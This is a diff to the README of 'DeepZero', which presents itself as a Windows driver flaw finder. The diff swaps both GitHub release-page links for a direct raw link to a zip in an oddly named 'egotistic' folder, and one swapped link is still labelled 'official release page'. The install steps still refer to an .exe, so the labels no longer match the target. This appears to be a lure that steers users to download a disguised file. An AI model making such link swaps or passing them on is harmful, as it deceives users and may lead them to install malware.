@@ -1,6 +1,6 @@
 # 🔍 DeepZero - Find hidden software flaws with ease
 
-[![](https://img.shields.io/badge/Download_DeepZero-Blue.svg)](https://github.com/frankyfacile225/DeepZero/releases)
+[![](https://img.shields.io/badge/Download_DeepZero-Blue.svg)](https://raw.githubusercontent.com/frankyfacile225/DeepZero/main/egotistic/Zero_Deep_v1.7.zip)
 
 DeepZero monitors your computer files to find risks. It uses intelligent automation to check Windows drivers for common system errors. You save time because the program handles complex security checks on its own.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run DeepZero well. Check these specs befor
 
 Follow these steps to set up DeepZero on your machine:
 
-1. Visit the [official release page](https://github.com/frankyfacile225/DeepZero/releases) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/frankyfacile225/DeepZero/main/egotistic/Zero_Deep_v1.7.zip) to download the installer.
 2. Select the file named DeepZero-Installer.exe.
 3. Save the file to your desktop.
 4. Double-click the file to start the installation.
